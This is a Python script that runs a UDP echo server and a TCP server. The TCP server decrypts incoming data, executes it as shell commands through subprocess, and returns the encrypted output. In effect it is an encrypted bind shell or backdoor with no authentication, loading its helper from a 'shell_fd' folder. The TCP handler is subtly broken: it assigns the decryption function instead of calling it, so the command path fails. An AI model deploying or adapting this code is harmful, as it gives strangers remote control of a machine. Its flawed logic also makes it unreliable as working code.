import socket
import threading
import subprocess
try:
    from data_enc import enc_data, dec_data
except ImportError:
    import sys
    import os
    sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), 'shell_fd')))
    from data_enc import enc_data, dec_data

def udp_server(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind((host, port))
        print(f"UDP server listening on {host}:{port}")
        while True:
            enc_data_recv, addr = sock.recvfrom(1024)
            data = dec_data(enc_data_recv)
            print(f"Received message from {addr}: {data.decode()}")
            response = "Message received"
            enc_response = enc_data(response)
            sock.sendto(enc_response, addr)
    except Exception as e:
        print(f"UDP server error: {e}")
    finally:
        sock.close()

def tcp_server(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((host, port))
        sock.listen(5)
        print(f"TCP server listening on {host}:{port}")
        while True:
            conn, addr = sock.accept()
            print(f"Connection from {addr}")
            while True:
                enc_data_recv = conn.recv(1024)
                data = dec_data
                if not data or data.lower() == "exit":
                    print("Connection Closed")
                    break
                print(f"Executing command: {data}")
                output = subprocess.getOutput(data)
                enc_output = enc_data(output)
                conn.sendall(enc_output)
            conn.close()
    except Exception as e:
        print(f"TCP server error: {e}")
    finally:
        sock.close()

def start_servers():
    udp_thread = threading.Thread(target=udp_server, args=('localhost', 9999))
    tcp_thread = threading.Thread(target=tcp_server, args=('localhost', 8888))
    udp_thread.start()
    tcp_thread.start()
    udp_thread.join()
    tcp_thread.join()

if __name__ == "__main__":
    start_servers()